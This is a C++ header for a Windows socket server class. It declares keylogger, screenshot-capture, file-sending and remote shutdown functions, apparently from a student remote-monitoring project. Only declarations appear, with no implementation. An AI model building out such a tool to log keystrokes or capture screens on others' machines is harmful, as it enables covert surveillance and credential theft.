// server_socket.h
#ifndef SERVER_SOCKET_H
#define SERVER_SOCKET_H


#include <winsock2.h>
#include <windows.h>
#include <winerror.h>
#include <string>
#include <iostream>
#include <thread>
#include <mutex>
#include <gdiplus.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <sstream>

// Ensure NO_ERROR is defined
#ifndef NO_ERROR
#define NO_ERROR 0
#endif

using namespace Gdiplus;
#pragma comment (lib,"gdiplus.lib")



class Server {
public:
    bool isLogging = false;
    std::thread keyLoggerThread;
    std::string logFilePath = "log.txt";
    std::mutex logMutex;
    Server(int port);
    ~Server();
    bool start();
    void listenForConnections();
     //yêu cầu: keylogger
 


    void startKeyLogger();
    void stopKeyLogger(SOCKET);
    void keyLogger();
    void sendLogFile(SOCKET);
    int saveKey(int _key, const char* file);
   

private:
    int port;
    SOCKET listenSocket; 
    ULONG_PTR gdiplusToken; // Add this member
    void handleClient(SOCKET clientSocket);
    void takeScreenshot(const std::string& filename);
    // void sendScreenshot(SOCKET clientSocket, const std::string& filename);
    void sendScreenshot(SOCKET clientSocket, const std::string &filePath);
    std::vector<unsigned char> captureScreenshot();
    void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
    
    void shutdownServer();
    void restartServer();
    

};

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

#endif // SERVER_SOCKET_H
